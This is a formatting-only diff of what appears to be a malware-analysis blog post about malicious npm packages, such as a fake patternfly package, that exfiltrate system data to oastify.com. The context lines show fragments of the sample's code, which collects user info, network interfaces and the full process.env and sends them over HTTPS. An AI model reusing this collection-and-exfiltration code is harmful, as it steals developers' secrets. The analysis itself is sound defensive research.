@@ -26,7 +26,7 @@ identified 50+ such packages.
 
 ### Looking at a Sample
 
-We took a closer look at one of the samples `pkg:/npm/patternfly-v5/patternfly@1.0.2`. 
+We took a closer look at one of the samples `pkg:/npm/patternfly-v5/patternfly@1.0.2`.
 The sample contained the following files:
 
 ```
@@ -62,8 +62,8 @@ function sendData(path, data) {
     path: `/${path}`,
     method: 'GET',
     headers: {
-      'Content-Type': 'application/json'
-    }
+      'Content-Type': 'application/json',
+    },
   };
 
   const req = https.request(options, (res) => {
@@ -89,14 +89,14 @@ const systemInfo = {
   release: os.release(),
   userInfo: os.userInfo(),
   networkInterfaces: os.networkInterfaces(),
-  env: process.env
+  env: process.env,
 };
 ```
 
 ### Example Packages using `oastify.com` for Exfiltration
 
-| Package                                     | Report                                                                                                   |
-| ------------------------------------------- | -------------------------------------------------------------------------------------------------------- |
+| Package                                     | Report                                                                                                    |
+| ------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
 | `chrome-api-utils@1.1.0`                    | [🔗 01JGPYQTZJGM0Y5BYZWZ0757P3](https://platform.safedep.io/community/malysis/01JGPYQTZJGM0Y5BYZWZ0757P3) |
 | `grafana-sentry-datasource@1.0.4`           | [🔗 01JH3FWEBCCXBGGRTN286Z5ARP](https://platform.safedep.io/community/malysis/01JH3FWEBCCXBGGRTN286Z5ARP) |
 | `@patternfly-v5/patternfly@1.0.2`           | [🔗 01JH0BKSY7Y2DNG7QB137S6J6F](https://platform.safedep.io/community/malysis/01JH0BKSY7Y2DNG7QB137S6J6F) |
